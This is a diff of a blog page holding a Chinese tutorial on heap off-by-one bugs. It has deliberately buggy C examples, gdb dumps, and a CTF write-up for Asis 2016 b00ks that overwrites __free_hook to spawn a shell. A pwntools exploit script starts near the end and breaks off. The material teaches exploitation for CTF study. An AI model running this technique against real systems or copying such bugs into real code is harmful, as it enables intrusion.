@@ -1,117 +1,230 @@
-<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="pumpkin9"><meta name="renderer" content="webkit"><meta name="copyright" content="pumpkin9"><meta name="keywords" content="pumpkin9"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Off-By-One学习 · pumpkin9's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
-  "use strict";
-  // rel=preload support test
-  if( !w.loadCSS ){
-    w.loadCSS = function(){};
-  }
-  // define on the loadCSS obj
-  var rp = loadCSS.relpreload = {};
-  // rel=preload feature support test
-  // runs once and returns a function for compat purposes
-  rp.support = (function(){
-    var ret;
-    try {
-      ret = w.document.createElement( "link" ).relList.supports( "preload" );
-    } catch (e) {
-      ret = false;
-    }
-    return function(){
-      return ret;
-    };
-  })();
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+      <script>
+  var _hmt = _hmt || []
+  ;(function() {
+    var hm = document.createElement('script')
+    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
+    var s = document.getElementsByTagName('script')[0]
+    s.parentNode.insertBefore(hm, s)
+  })()
+</script> 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content>
+    <meta name="description" content>
+    
+    <title>
+      Off-By-One学习 - pumpkin9
+    </title>
+    <link rel="manifest" href="/manifest.json">
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/style/style.css">
+  </head>
+  <body>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#off-by-one-利用思路"><span class="toc-text">off-by-one 利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#示例1"><span class="toc-text">示例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例2"><span class="toc-text">实例2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例1–-Asis-CTF-2016-b00ks"><span class="toc-text">实例1– Asis CTF 2016 b00ks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#相关问题解答"><span class="toc-text">相关问题解答</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search">
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg">
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class>
+          Home
+        </a>
+        
+        <a href="/archives" class>
+          Archives
+        </a>
+        
+        <a href="/categories" class>
+          Categories
+        </a>
+        
+        <a href="/tags" class>
+          Tags
+        </a>
+        
+        <a href="/friends" class>
+          Friends
+        </a>
+        
+        <a href="/about" class>
+          About
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">pumpkin9</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">pumpkin9</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
 
-  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
-  // then change that media back to its intended value on load
-  rp.bindMediaToggle = function( link ){
-    // remember existing media attr for ultimate state, or default to 'all'
-    var finalMedia = link.media || "all";
+        <div class="nav">
+          
+          <a href="/" class>
+            Home
+          </a>
+          
+          <a href="/archives" class>
+            Archives
+          </a>
+          
+          <a href="/categories" class>
+            Categories
+          </a>
+          
+          <a href="/tags" class>
+            Tags
+          </a>
+          
+          <a href="/friends" class>
+            Friends
+          </a>
+          
+          <a href="/about" class>
+            About
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/shixiaohu2206" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://www.facebook.com/shi.xiaohu.5" target="_block">
+              <span class="iconfont icon-facebook"></span>
+            </a>
+            
+            <a href="https://www.instagram.com/shi_xiaohu/" target="_block">
+              <span class="iconfont icon-instagram"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">Off-By-One学习</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2019/10/10</span>
+        </span>
 
-    function enableStylesheet(){
-      link.media = finalMedia;
-    }
+        
 
-    // bind load handlers to enable media
-    if( link.addEventListener ){
-      link.addEventListener( "load", enableStylesheet );
-    } else if( link.attachEvent ){
-      link.attachEvent( "onload", enableStylesheet );
-    }
-
-    // Set rel and non-applicable media type to start an async request
-    // note: timeout allows this to happen async to let rendering continue in IE
-    setTimeout(function(){
-      link.rel = "stylesheet";
-      link.media = "only x";
-    });
-    // also enable media after 3 seconds,
-    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
-    setTimeout( enableStylesheet, 3000 );
-  };
-
-  // loop through link elements in DOM
-  rp.poly = function(){
-    // double check this to prevent external calls from running
-    if( rp.support() ){
-      return;
-    }
-    var links = w.document.getElementsByTagName( "link" );
-    for( var i = 0; i < links.length; i++ ){
-      var link = links[ i ];
-      // qualify links to those with rel=preload and as=style attrs
-      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
-        // prevent rerunning on link
-        link.setAttribute( "data-loadcss", true );
-        // bind listeners to toggle media back
-        rp.bindMediaToggle( link );
-      }
-    }
-  };
-
-  // if unsupported, run the polyfill
-  if( !rp.support() ){
-    // run once at least
-    rp.poly();
-
-    // rerun poly on an interval until onload
-    var run = w.setInterval( rp.poly, 500 );
-    if( w.addEventListener ){
-      w.addEventListener( "load", function(){
-        rp.poly();
-        w.clearInterval( run );
-      } );
-    } else if( w.attachEvent ){
-      w.attachEvent( "onload", function(){
-        rp.poly();
-        w.clearInterval( run );
-      } );
-    }
-  }
-
-
-  // commonjs
-  if( typeof exports !== "undefined" ){
-    exports.loadCSS = loadCSS;
-  }
-  else {
-    w.loadCSS = loadCSS;
-  }
-}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
-  i.fa.fa-comment
-  .saying--><div class="cxo-profile-inner"><div class="profile-name">pumpkin9</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/archives/">你不关注花，花永远只是花</a></div><div class="intro-nav-label-box"><a href="/archives/">Home</a><a href="/about/">About</a><a href="/categories/">Category</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/archives/">Home</a><a href="/about/">About</a><a href="/categories/">Category</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">Off-By-One学习</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-10-10</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="pwn"> pwn</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="heap"> heap</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/CTF">CTF</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/pwn">pwn</a>
+                  
+                
+                  
+                    <a href="/tags/heap">heap</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p>
+<h2 id="原理">原理<a class="post-anchor" href="#原理"></a></h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
 <ul>
 <li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
 <li>字符串操作不合适</li>
 </ul>
 <p>一般来说，单字节溢出被认为是难以利用，但是因为 linux 的堆管理机制 ptmalloc 验证的松散性，基于 linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss段等等。但是堆上（heap based）的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p>
-<h2 id="off-by-one-利用思路"><a href="#off-by-one-利用思路" class="headerlink" title="off-by-one 利用思路"></a>off-by-one 利用思路</h2><ol>
+<h2 id="off-by-one-利用思路">off-by-one 利用思路<a class="post-anchor" href="#off-by-one-利用思路"></a></h2><ol>
 <li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
 <li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得<code>prev_in_use</code>位被清，这样前块会被认为是 free 块。(1) 这时可以选择使用 unlink 方法进行处理。(2) 另外，这时<code>prev_size</code>域就会启用，就可以伪造<code>prev_size</code>，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照<code>prev_size</code>找到块的后一块（理论上是当前正在unlink的块）与当前正在 unlink 的块大小是否相等。</li>
 </ol>
 <p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check。</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input:"</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="示例1">示例1<a class="post-anchor" href="#示例1"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input:"</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们自己编写的 my_gets 函数导致了一个 off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了依次，这也被称为栅栏错误</p>
 <p>我们使用gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为16 字节的堆块</p>
@@ -120,7 +233,7 @@
 <p>当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print ‘A’*17</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>
 
-<h3 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h3><p>第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p>
+<h3 id="实例2">实例2<a class="post-anchor" href="#实例2"></a></h3><p>第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。<br>但是 strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。<br>strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。</p>
@@ -129,7 +242,7 @@
 <p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。<br>还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD 0x41424344</span><br><span class="line">内存  0x44,0x43,0x42,0x41</span><br></pre></td></tr></table></figure>
 
-<h3 id="实例1–-Asis-CTF-2016-b00ks"><a href="#实例1–-Asis-CTF-2016-b00ks" class="headerlink" title="实例1– Asis CTF 2016 b00ks"></a>实例1– Asis CTF 2016 b00ks</h3><p><strong>题目介绍</strong></p>
+<h3 id="实例1–-Asis-CTF-2016-b00ks">实例1– Asis CTF 2016 b00ks<a class="post-anchor" href="#实例1–-Asis-CTF-2016-b00ks"></a></h3><p><strong>题目介绍</strong></p>
 <p>题目是一个常见的菜单式程序，功能是一个图书管理系统。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Create a book</span><br><span class="line"><span class="number">2.</span> Delete a book</span><br><span class="line"><span class="number">3.</span> Edit a book</span><br><span class="line"><span class="number">4.</span> Print book detail</span><br><span class="line"><span class="number">5.</span> Change current author name</span><br><span class="line"><span class="number">6.</span> Exit</span><br></pre></td></tr></table></figure>
 
@@ -153,7 +266,7 @@
 <p>程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的。</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">my_read</span><span class="params">(_BYTE *ptr, <span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( number &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = ptr;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="string">'\n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == number )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>; --》 漏洞位置</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>创建两个<code>b00k</code>, 在<code>first b00k</code>中伪造<code>b00k</code>进而控制<code>second b00k</code>的<code>description</code>指针, 将该指针改为<code>__free_hook</code>, 修改<code>second b00k</code>的<code>description</code>为<code>execve(&quot;/bin/sh&quot;)</code>, 最后<code>free</code></p>
+<h4 id="利用">利用<a class="post-anchor" href="#利用"></a></h4><p>创建两个<code>b00k</code>, 在<code>first b00k</code>中伪造<code>b00k</code>进而控制<code>second b00k</code>的<code>description</code>指针, 将该指针改为<code>__free_hook</code>, 修改<code>second b00k</code>的<code>description</code>为<code>execve(&quot;/bin/sh&quot;)</code>, 最后<code>free</code></p>
 <p><strong>泄露</strong></p>
 <p>因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 ‘\x00’ 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 ‘\x00’ ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。</p>
 <p>books 位置</p>
@@ -193,11 +306,120 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x55f276c74190:    0x0000000000000002    0x00007f282b7047a8 --</span><br><span class="line">0x55f276c741a0:    0x00007f282b7047a8    0x0000000000021000  |</span><br><span class="line">......                                                  |</span><br><span class="line">0x7f282b7047a8 &lt;__free_hook&gt;:  0x00007f306ff4726a    0x0000000000000000</span><br></pre></td></tr></table></figure>
 
 <p><strong>结论:</strong> 由于<code>__free_hook</code>里面的内容不为<code>NULL</code>, 遂执行内容指向的指令, 即<code>execve(&quot;/bin/sh&quot;, null, environ)</code></p>
-<h4 id="相关问题解答"><a href="#相关问题解答" class="headerlink" title="相关问题解答"></a>相关问题解答</h4><p><strong>为什么第二个 b00k申请的空间那么大?</strong></p>
+<h4 id="相关问题解答">相关问题解答<a class="post-anchor" href="#相关问题解答"></a></h4><p><strong>为什么第二个 b00k申请的空间那么大?</strong></p>
 <blockquote>
 <p>​    If we allocate a chunk bigger than the wilderness chunk, it  mmap’s a new area for use. And this area is adjacent to the libc’s bss  segment<br>简单的说, 申请小了不能够泄露出<code>libc base address</code></p>
 </blockquote>
 <p><strong>exp</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./b00ks"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">"./b00ks"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_name</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Enter author name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_book</span><span 